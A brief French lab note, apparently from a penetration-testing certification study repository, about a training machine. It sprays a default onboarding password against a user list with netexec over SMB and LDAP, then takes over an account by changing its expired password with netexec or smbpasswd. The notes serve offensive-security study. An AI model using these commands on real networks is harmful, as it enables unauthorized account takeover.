Lors d'une intégration d'un colalborateur, il est possible de devoir changer un mot de passe générique

Trouver un compte ou l'peut changer le mdp actuel
```bash 
netexec smb 10.129.234.71 -u users.txt -p 'BabyStart123!'
netexec ldap 10.129.234.71 -u users.txt -p 'BabyStart123!'
```
![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804103500.png)
```bash 
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'BabyStart123!'
```

Changer le password le Caroline Robinson
Methode 1 : 
```bash 
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'BabyStart123!' -M change-password -o NEWPASS='Password123!'
netexec smb 10.129.234.71 -u Caroline.Robinson -p 'Password123!'
```
![alt text](https://github.com/milouzevich/CPTS/blob/main/AD/images/Pasted%20image%2020260804103834.png)

Methode 2  :

```
smbpasswd -U BABY/caroline.robinson -r baby.vl
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user caroline.robinson
```
